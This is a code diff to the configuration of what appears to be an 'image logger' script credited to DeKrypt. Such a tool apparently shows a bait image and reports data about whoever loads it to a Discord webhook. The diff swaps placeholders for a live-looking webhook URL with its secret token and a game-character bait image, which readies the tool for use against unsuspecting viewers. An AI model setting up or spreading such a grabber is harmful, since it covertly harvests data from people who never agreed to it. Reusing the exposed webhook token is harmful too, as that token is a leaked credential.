@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1343690580043104316/FTQrFIUU1Uqbn0xyLz2yy9J21ss1i7tlP8Xmy-tC_FGGeGhQ4LXbEtuM7Y9ykfBoNhR9",
+    "image": "https://static.wikia.nocookie.net/marvel-rivals/images/4/4e/The_Thing_HeroPortrait.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
